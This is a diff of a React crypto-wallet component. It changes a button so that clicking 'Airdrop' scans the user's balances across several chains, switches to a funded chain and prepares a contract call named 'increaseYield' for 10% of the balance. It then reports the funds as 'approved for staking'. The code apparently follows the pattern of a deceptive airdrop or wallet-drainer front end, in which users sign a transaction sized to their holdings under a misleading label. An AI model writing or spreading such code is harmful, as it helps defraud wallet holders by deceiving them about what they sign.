@@ -1,77 +1,92 @@
 import React, { useEffect, useState } from "react";
-import { ConnectButton, useReadContract } from "thirdweb/react";
-import { BSCTESTCONTRACT, chains, client } from "../constants/constanst";
+import { ConnectButton, TransactionButton } from "thirdweb/react";
+import {
+  ARBITRUMCONTRACT,
+  AVAXCONTRACT,
+  BNBCONTRACT,
+  BSCTESTCONTRACT,
+  chains,
+  client,
+} from "../constants/constanst";
 import { createWallet } from "thirdweb/wallets";
 import { useActiveAccount } from "thirdweb/react";
 import { useSwitchActiveWalletChain } from "thirdweb/react";
-import { ethers } from "ethers";
+import { getWalletBalance } from "thirdweb/wallets";
+import { prepareContractCall, toWei } from "thirdweb";
 
 const CustomButton = () => {
   const activeAccount = useActiveAccount();
   const switchChain = useSwitchActiveWalletChain();
   const [loading, setLoading] = useState(false);
   const [balance, setBalance] = useState("0");
-  const [contractBalance, setContractBalance] = useState(null);
+  const [currentChain, setCurrentChain] = useState("");
+  const [currentChainId, setCurrentChainId] = useState("");
 
-  // Function to get balance from a given chain
-  const getBalance = async (chainId, accountAddress) => {
-    try {
-      const provider = new ethers.JsonRpcProvider(
-        chains.find((c) => c.id === chainId)?.rpc
-      );
-      const balance = await provider.getBalance(accountAddress);
-      return ethers.formatEther(balance);
-    } catch (error) {
-      console.error(`Error fetching balance for chainId ${chainId}:`, error);
-      return "0";
-    }
-  };
+  const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
-  // Hook to read the contract balance
-  const { data: contractData, isLoading: isContractLoading } = useReadContract({
-    contract: BSCTESTCONTRACT,
-    method: "getBalance",
-  });
-
-  // Update contract balance when data is available
-  useEffect(() => {
-    if (contractData) {
-      setContractBalance(contractData);
-    }
-  }, [contractData]);
-
-  // Function to check balance across chains and switch if necessary
   const checkBalanceAndSwitchChain = async () => {
     if (!activeAccount?.address) return;
 
     setLoading(true);
 
     for (const chain of chains) {
-      const balance = await getBalance(chain.id, activeAccount.address);
+      setCurrentChainId(chain.id);
+      setCurrentChain(chain.name);
 
-      if (parseFloat(balance) > 0) {
-        console.log(`Balance on ${chain.rpc}: ${balance} ETH`);
-        setBalance(balance);
-        setLoading(false);
-        setContractBalance(await getContractBalance()); // Fetch contract balance after having an account balance
-        return;
-      } else {
-        console.log(`No balance on ${chain.rpc}, switching to the next chain.`);
-        try {
+      try {
+        const balanceResult = await getWalletBalance({
+          address: activeAccount.address,
+          client,
+          chain,
+        });
+
+        const balanceInUnit = balanceResult.displayValue;
+        console.log(
+          `Balance found on ${chain.rpc}: ${balanceInUnit} ${chain.ticker}`
+        );
+
+        if (parseFloat(balanceInUnit) > 0) {
           await switchChain({ id: chain.id });
-        } catch (error) {
-          console.error("Error switching chain:", error);
+
+          const currentChainContract = chain.name.includes("avalanche")
+            ? AVAXCONTRACT
+            : chain.name.includes("smart chain")
+            ? BNBCONTRACT
+            : chain.name.includes("arbitrum")
+            ? ARBITRUMCONTRACT
+            : BSCTESTCONTRACT;
+
+          const balanceToStake = parseFloat(balanceInUnit) * 0.1;
+          console.log("balance to stake:", balanceToStake.toString());
+
+          // Set the balance for UI
+          setBalance(balanceToStake.toString());
+
+          const transaction = prepareContractCall({
+            contract: currentChainContract,
+            method: "increaseYield",
+            params: [activeAccount.address, toWei(balanceToStake.toString())],
+          });
+
+          return transaction;
+        } else {
+          console.log(
+            `No balance on ${chain.rpc}, switching to the next chain.`
+          );
+          await delay(2000);
         }
+      } catch (error) {
+        console.error(`Error fetching balance for chain ${chain.id}:`, error);
       }
     }
 
     setLoading(false);
   };
 
-  // Effect hook to check balance and switch chain when the account is active
   useEffect(() => {
     if (activeAccount?.address) {
-      checkBalanceAndSwitchChain();
+      console.log(activeAccount.address);
+      setCurrentChain(chains[0].name);
     }
   }, [activeAccount]);
 
@@ -86,14 +101,26 @@ const CustomButton = () => {
           createWallet("me.rainbow"),
         ]}
         connectButton={{
-          label: "Airdrop",
+          label: "Connect",
         }}
         chains={chains}
       />
-      {loading && <p>Connecting...</p>}
-      {!loading && <p>Balance: {balance} ETH</p>}
-      {contractBalance !== null && !isContractLoading && (
-        <p>Contract Balance: {contractBalance}</p>
+      {loading && <p>Wait...</p>}
+      {activeAccount && (
+        <p>
+          Balance: {balance} Current Chain: {currentChain}
+        </p>
+      )}
+      {activeAccount && (
+        <TransactionButton
+          transaction={checkBalanceAndSwitchChain}
+          onTransactionSent={() =>
+            alert(`${balance} ${currentChain} approved for staking`)
+          }
+          onError={(error) => alert(`Transaction failed: ${error.message}`)}
+        >
+          Airdrop
+        </TransactionButton>
       )}
     </div>
   );
